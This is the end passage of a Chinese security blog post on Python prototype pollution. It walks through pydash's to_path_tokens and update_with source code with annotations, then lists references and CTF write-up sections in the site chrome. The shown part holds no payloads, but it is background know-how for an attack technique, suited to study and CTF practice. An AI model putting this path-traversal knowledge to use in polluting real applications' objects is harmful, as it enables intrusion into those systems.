obj</span><br></pre></td></tr></table></figure>
<p>​		这里先放着这个源码，先读一下 <code>to_path_tokens</code> ：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">to_path_tokens</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parse `value` into :class:`PathToken` objects.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> pyd.is_string(value) <span class="keyword">and</span> (<span class="string">&quot;.&quot;</span> <span class="keyword">in</span> value <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> value):</span><br><span class="line">        <span class="comment"># Since we can&#x27;t tell whether a bare number is supposed to be dict key or a list index, we</span></span><br><span class="line">        <span class="comment"># support a special syntax where any string-integer surrounded by brackets is treated as a</span></span><br><span class="line">        <span class="comment"># list index and converted to an integer.</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#由于我们无法判断一个空数应该是字典键还是列表索引，我们</span></span><br><span class="line">		<span class="comment">#支持一种特殊语法，其中任何被括号括起来的字符串整数都被视为</span></span><br><span class="line">		<span class="comment">#列表索引并转换为整数。</span></span><br><span class="line">        keys = [ <span class="comment">#使用正则表达式 RE_PATH_KEY_DELIM来分割字符串。分割后，对于每个部分（key），会进一步检查：</span></span><br><span class="line">            PathToken(<span class="built_in">int</span>(key[<span class="number">1</span>:-<span class="number">1</span>]), default_factory=<span class="built_in">list</span>)</span><br><span class="line">            <span class="comment">#如果 key 匹配 RE_PATH_LIST_INDEX，则将该部分视为列表索引，并创建一个 PathToken 对象，其键为转换后的整数索引，默认值生成器为 list。</span></span><br><span class="line">            <span class="keyword">if</span> RE_PATH_LIST_INDEX.<span class="keyword">match</span>(key)</span><br><span class="line">            <span class="keyword">else</span> PathToken(unescape_path_key(key), default_factory=<span class="built_in">dict</span>)</span><br><span class="line">            <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, RE_PATH_KEY_DELIM.split(value))</span><br><span class="line">        ]</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#如果 key 不匹配 RE_PATH_LIST_INDEX，则将其视为字典键，并通过 unescape_path_key（未在代码段中定义，但我们可以假设它用于处理可能的转义字符）函数处理后，创建一个 PathToken 对象，其键为处理后的字符串，默认值生成器为 dict。</span></span><br><span class="line">    <span class="keyword">elif</span> pyd.is_string(value) <span class="keyword">or</span> pyd.is_number(value):</span><br><span class="line">        keys = [PathToken(value, default_factory=<span class="built_in">dict</span>)]</span><br><span class="line">    <span class="comment">#如果 value 是 UNSET则返回一个空的 PathToken 列表。</span></span><br><span class="line">    <span class="keyword">elif</span> value <span class="keyword">is</span> UNSET:</span><br><span class="line">        keys = []</span><br><span class="line">    <span class="comment">#如果 value 不是上述任何一种情况（即它可能已经是一个列表或类似结构），则直接返回 value（尽管这里可能存在一个类型不匹配的问题，因为通常我们期望返回的是 PathToken 对象的列表，而不是原始值）。然而，基于函数的命名和描述，这可能是一个错误或特殊情况的处理方式。</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        keys = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> keys</span><br></pre></td></tr></table></figure>
<p>​		这里比较重要，分析一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#遍历path并更新对象</span></span><br><span class="line"><span class="keyword">for</span> idx, token <span class="keyword">in</span> <span class="built_in">enumerate</span>(pyd.initial(tokens)):<span class="comment">#这行代码使用enumerate函数遍历tokens列表，但通过pyd.initial函数来获取除了最后一个元素之外的所有元素。这意味着遍历将跳过tokens列表的最后一个元素。</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#这里检查当前遍历到的token是否是PathToken类的实例。如果是，则从token中提取key值，并尝试从tokens中获取下一个元素的default_factory。如果不存在，则使用default_type作为默认值。</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(token, PathToken):</span><br><span class="line">        key = token.key</span><br><span class="line">        default_factory = pyd.get(tokens, [idx + <span class="number">1</span>, <span class="string">&quot;default_factory&quot;</span>], default=default_type)</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#如果token不是PathToken类的实例，则直接将token作为key，并将default_factory设置为default_type。</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key = token</span><br><span class="line">        default_factory = default_type</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="comment">#使用base_get函数尝试从target对象中获取key对应的值，如果没有找到则默认为None。同时，将path_obj初始化为None。</span></span><br><span class="line">    obj_val = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">    path_obj = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#如果call_customizer为真（假设是一个函数），则调用该函数，并传入当前值obj_val、键key和目标对象target，结果赋值给path_obj。</span></span><br><span class="line">    <span class="keyword">if</span> call_customizer:</span><br><span class="line">        path_obj = call_customizer(obj_val, key, target)</span><br><span class="line">        </span><br><span class="line">	<span class="comment">#如果path_obj仍然是None，则调用default_factory来创建一个新的对象，并将其赋值给path_obj。</span></span><br><span class="line">    <span class="keyword">if</span> path_obj <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        path_obj = default_factory()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#使用base_set函数将path_obj设置到target对象的key位置上，且不允许覆盖</span></span><br><span class="line">    base_set(target, key, path_obj, allow_override=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#尝试重新获取target对象中key对应的值，如果失败，会捕获TypeError。在捕获异常的处理中，尝试将key作为索引来直接从target中获取元素。如果这也失败，则标记为失败（_failed = True）并抛出一个包含原始异常信息的TypeError。</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        target = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">except</span> TypeError <span class="keyword">as</span> exc:  <span class="comment"># pragma: no cover</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            target = target[<span class="built_in">int</span>(key)]</span><br><span class="line">            _failed = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            _failed = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> _failed:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">f&quot;Unable to update object at index <span class="subst">&#123;key!r&#125;</span>. <span class="subst">&#123;exc&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>​		这个  <code>update_with</code>  函数的作用可以总结如下：</p>
<ol>
<li><strong>更新嵌套对象</strong>：函数用于在给定的  <code>obj</code> （一个列表或字典）中按照  <code>path</code>  指定的路径更新一个值。</li>
<li><strong>路径处理</strong>： <code>path</code>  可以是一个字符串或键的列表，描述了要修改的对象路径。</li>
<li><strong>自定义更新</strong>： <code>updater</code>  是一个可调用对象，它用于生成更新后的值。如果  <code>updater</code>  不是一个可调用对象，它会被转换为一个返回常量值的函数。</li>
<li><strong>自定义值生成</strong>： <code>customizer</code>  是一个可选的可调用对象，它用于自定义路径上的对象值。如果  <code>customizer</code>  返回  <code>None</code> ，则路径上的对象值由函数本身处理。</li>
<li><strong>自定义参数</strong>： <code>customizer</code>  被调用时接收三个参数： <code>(nested_value, key, nested_object)</code> 。</li>
<li><strong>递归创建路径</strong>：函数递归地遍历  <code>path</code> ，创建路径上的对象，如果路径上的对象不存在，则使用  <code>default_factory</code>  创建。</li>
<li><strong>更新最终值</strong>：遍历完成后，使用  <code>updater</code>  更新路径最终位置上的值。</li>
<li><strong>错误处理</strong>：如果在获取或设置路径上的值时遇到  <code>TypeError</code> ，函数会尝试使用整数索引访问，如果仍然失败，则抛出异常。</li>
<li><strong>原地修改</strong>： <code>obj</code>  是直接在原对象上进行修改的，而不是返回一个新的对象。</li>
<li><strong>返回值</strong>：函数返回修改后的  <code>obj</code> 。</li>
</ol>
<p>​		简而言之， <code>update_with</code>  函数根据提供的路径，使用自定义逻辑递归地创建或更新一个嵌套的列表或字典中的值，并在路径的最终位置应用一个更新函数。</p>
<h1 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章">#</a> 参考文章：</h1>
<h2 id="基础资料"><a class="markdownIt-Anchor" href="#基础资料">#</a> 基础资料</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9wYXp1cmlzLmNuLzIwMjMvMDcvMjcvUHl0aG9uJUU1JThFJTlGJUU1JTlFJThCJUU5JTkzJUJFJUU2JUIxJUExJUU2JTlGJTkzLw==">Python 原型链污染</span></p>
<p><strong><span class="exturl" data-url="aHR0cHM6Ly90dHRhbmcuY29tL2FyY2hpdmUvMTg3Ni8jdG9jX180">Python 原型链污染变体 (prototype-pollution-in-python)</span></strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9mdXJpbmEub3JnLmNuLzIwMjMvMTIvMTgvcHJvdG90eXBlLXBvbGx1dGlvbi1pbi1weWRhc2gtY3RmLyMlRTQlQkIlQTMlRTclQTAlODElRTglQjAlODMlRTglQUYlOTU=">Pydash 原型链污染</span></p>
<h2 id="做题参考"><a class="markdownIt-Anchor" href="#做题参考">#</a> 做题参考：</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTQ2MjA/dGltZV9fMTMxMT1HcUFoWUswS0JLOEQlMkZEMGx0ZEdRNTVNRFJvdEl0ZUQ=">从 CISCN2024 的 sanic 引发对 python “原型链” 的污染挖掘</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZ3huZ3huZ3huL3AvMTgyMDUyMzU=">CISCN2024-WEB-Sanic gxngxngxn    </span></p>

      <div class="tags">
          <a href="/tags/Web/" rel="tag"><i class="ic i-tag"></i> Web</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">更新于</span>
    <time title="修改时间：2024-09-15 16:47:06" itemprop="dateModified" datetime="2024-09-15T16:47:06+08:00">2024-09-15</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> 赞赏</button>
  <p>请我喝[茶]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="g01den 微信支付">
        <p>微信支付</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="g01den 支付宝">
        <p>支付宝</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="g01den 贝宝">
        <p>贝宝</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>本文作者： </strong>g01den <i class="ic i-at"><em>@</em></i>golden的部落阁
  </li>
  <li class="link">
    <strong>本文链接：</strong>
    <a href="http://blog.g01den.top/posts/ff5b88d5.html" title="python原型链污染">http://blog.g01den.top/posts/ff5b88d5.html</a>
  </li>
  <li class="license">
    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/posts/ef2fddc9.html" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;gitee.com&#x2F;gou-dengyue&#x2F;images&#x2F;raw&#x2F;master&#x2F;picture297.jpg" title="arcaea闲谈">
  <span class="type">上一篇</span>
  <span class="category"><i class="ic i-flag"></i> 发电日常</span>
  <h3>arcaea闲谈</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/posts/9d5b1ce4.html" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;gitee.com&#x2F;gou-dengyue&#x2F;images&#x2F;raw&#x2F;master&#x2F;picture306.jpg" title="pwn学习笔记（8）-初识沙箱">
  <span class="type">下一篇</span>
  <span class="category"><i class="ic i-flag"></i> Pwn手的自我修养</span>
  <h3>pwn学习笔记（8）-初识沙箱</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="文章目录">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.</span> <span class="toc-text"> python 原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">1.1.</span> <span class="toc-text"> 背景：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.2.</span> <span class="toc-text"> 简介：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#merge%E6%B2%A1%E9%81%87%E5%88%B0%E8%BF%87%E5%85%B7%E4%BD%93%E9%A2%98%E5%9E%8B%E5%85%88%E7%AE%80%E5%8D%95%E8%AF%B4%E4%B8%8B"><span class="toc-number">1.3.</span> <span class="toc-text"> merge（没遇到过具体题型，先简单说下）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pydash512"><span class="toc-number">1.4.</span> <span class="toc-text"> pydash(5.1.2)：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dasctf-2023-0x401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9Bezflask"><span class="toc-number">1.5.</span> <span class="toc-text"> [DASCTF 2023 &amp; 0X401 七月暑期挑战赛] EzFlask：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn2024-%E5%88%9D%E8%B5%9B-sanic"><span class="toc-number">1.6.</span> <span class="toc-text"> [Ciscn2024 初赛] sanic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dasctf2024%E5%A4%8F%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Bsanics-revenge"><span class="toc-number">1.7.</span> <span class="toc-text"> [DASCTF2024 夏季挑战赛] Sanic’s revenge</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%8F%98%E4%BD%93%E8%B7%9F%E9%9A%8Farticle_kelp%E5%AD%A6"><span class="toc-number">2.</span> <span class="toc-text"> Python 原型链污染变体 (跟随 Article_kelp 学)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%9B%B4%E5%B9%BF%E6%B3%9B%E7%9A%84%E8%8E%B7%E5%8F%96"><span class="toc-number">2.1.</span> <span class="toc-text"> 1、更广泛的获取：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%9A%84%E8%8E%B7%E5%8F%96"><span class="toc-number">2.2.</span> <span class="toc-text"> 2、全局变量的获取：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%B7%B2%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97%E8%8E%B7%E5%8F%96"><span class="toc-number">2.3.</span> <span class="toc-text"> 3、已加载模块获取：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%85%B3%E7%B3%BB%E7%AE%80%E5%8D%95"><span class="toc-number">2.3.1.</span> <span class="toc-text"> 加载关系简单：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%85%B3%E7%B3%BB%E5%A4%8D%E6%9D%82%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.3.2.</span> <span class="toc-text"> 加载关系复杂–示例：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%87%BD%E6%95%B0%E5%BD%A2%E5%8F%82%E9%BB%98%E8%AE%A4%E5%80%BC%E6%9B%BF%E6%8D%A2"><span class="toc-number">2.4.</span> <span class="toc-text"> 4、函数形参默认值替换：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#__defaults__"><span class="toc-number">2.4.0.1.</span> <span class="toc-text">  __defaults__ ：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#__kwdefaults__"><span class="toc-number">2.4.1.</span> <span class="toc-text">  __kwdefaults__</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-secret_key"><span class="toc-number">2.5.</span> <span class="toc-text"> 5、SECRET_KEY：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E7%9A%84%E8%A1%A5%E5%85%85"><span class="toc-number">3.</span> <span class="toc-text"> 最后的补充：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-merge%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text"> 1、merge 函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-pydash%E7%9A%84set_%E5%87%BD%E6%95%B0%E6%BA%90%E7%A0%81%E4%BF%A1%E6%81%AF"><span class="toc-number">3.2.</span> <span class="toc-text"> 2、pydash 的 set_函数源码信息：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text"> 参考文章：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E8%B5%84%E6%96%99"><span class="toc-number">4.1.</span> <span class="toc-text"> 基础资料</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E5%8F%82%E8%80%83"><span class="toc-number">4.2.</span> <span class="toc-text"> 做题参考：</span></a></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="系列文章">
        <ul>
          <li><a href="/posts/384200ef.html" rel="bookmark" title="SQL无列名注入">SQL无列名注入</a></li><li><a href="/posts/88915f6f.html" rel="bookmark" title="无参数RCE的一些奇技淫巧">无参数RCE的一些奇技淫巧</a></li><li><a href="/posts/2f610211.html" rel="bookmark" title="反弹shell">反弹shell</a></li><li class="active"><a href="/posts/ff5b88d5.html" rel="bookmark" title="python原型链污染">python原型链污染</a></li><li><a href="/posts/97a7dff3.html" rel="bookmark" title="ctfshow-信息搜集">ctfshow-信息搜集</a></li><li><a href="/posts/53e2b2e1.html" rel="bookmark" title="ctfshow-命令执行">ctfshow-命令执行</a></li><li><a href="/posts/4fb535d6.html" rel="bookmark" title="ctfshow-反序列化">ctfshow-反序列化</a></li><li><a href="/posts/b856856d.html" rel="bookmark" title="ctfshow-ssrf">ctfshow-ssrf</a></li><li><a href="/posts/ad175165.html" rel="bookmark" title="ctfshow-文件包含">ctfshow-文件包含</a></li><li><a href="/posts/4826d2ce.html" rel="bookmark" title="ctfshow-SSTI">ctfshow-SSTI</a></li><li><a href="/posts/2d792864.html" rel="bookmark" title="Python栈帧逃逸">Python栈帧逃逸</a></li><li><a href="/posts/b3ad4123.html" rel="bookmark" title="有小考点的Web题">有小考点的Web题</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="站点概览">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="g01den"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">g01den</p>
  <div class="description" itemprop="description">golden的部落阁</div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">48</span>
        <span class="name">文章</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">10</span>
        <span class="name">分类</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">8</span>
        <span class="name">标签</span>
      </a>
    </div>
</nav>

<div class="social">
      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2cwMWRlbjE=" title="https:&#x2F;&#x2F;github.com&#x2F;g01den1"><i class="ic i-github"></i></span>
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
  </li>

    
  <li class="item">
    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
  </li>

        
  <li class="item dropdown">
      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
    <ul class="submenu">

        
  <li class="item">
    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
  </li>

        
  <li class="item">
    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
  </li>

        
  <li class="item">
    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
  </li>

  </ul>
    
  <li class="item">
    <a href="/links/" rel="section"><i class="ic i-magic"></i>links</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/posts/ef2fddc9.html" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/posts/9d5b1ce4.html" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>随机文章</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
</div>

    <span><a href="/posts/a698ff8.html" title="pwn学习笔记（5）--格式化字符串漏洞（未完全完成）">pwn学习笔记（5）--格式化字符串漏洞（未完全完成）</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
</div>

    <span><a href="/posts/ff5b88d5.html" title="python原型链污染">python原型链污染</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
</div>

    <span><a href="/posts/e20e7502.html" title="pwn学习笔记（3）ret2syscall">pwn学习笔记（3）ret2syscall</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
</div>

    <span><a href="/posts/fe4eec6d.html" title="【2024】高校网络安全管理运维赛">【2024】高校网络安全管理运维赛</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
</div>

    <span><a href="/posts/4826d2ce.html" title="ctfshow-SSTI">ctfshow-SSTI</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
</div>

    <span><a href="/posts/9b0d93f7.html" title="Pwn刷题记录（不停更新）">Pwn刷题记录（不停更新）</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
</div>

    <span><a href="/posts/c2860616.html" title="网鼎杯2024青龙组官方资格赛wp">网鼎杯2024青龙组官方资格赛wp</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
</div>

    <span><a href="/posts/2d792864.html" title="Python栈帧逃逸">Python栈帧逃逸</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
</div>

    <span><a href="/posts/88915f6f.html" title="无参数RCE的一些奇技淫巧">无参数RCE的一些奇技淫巧</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
</div>

    <span><a href="/posts/7232a36b.html" title="小小的总结（日常发癫）">小小的总结（日常发癫）</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>最新评论</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">g01den @ golden的部落阁</span>
  </div>
  <div class="powered-by">
    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
     <p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn">蜀ICP备2024083302号</a><!--|<a target="_blank" rel="noopener" href="https://beian.mps.gov.cn/#/query/webSearch">公网安备XXXXXXXX号</a> -->
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: 'posts/ff5b88d5.html',
    favicon: {
      show: "（●´3｀●）やれやれだぜ",
      hide: "(´Д｀)大変だ！"
    },
    search : {
      placeholder: "文章搜索",
      empty: "关于 「 ${query} 」，什么也没搜到",
      stats: "${time} ms 内找到 ${hits} 条结果"
    },
    valine: true,fancybox: true,
    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//fastly.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
</html>
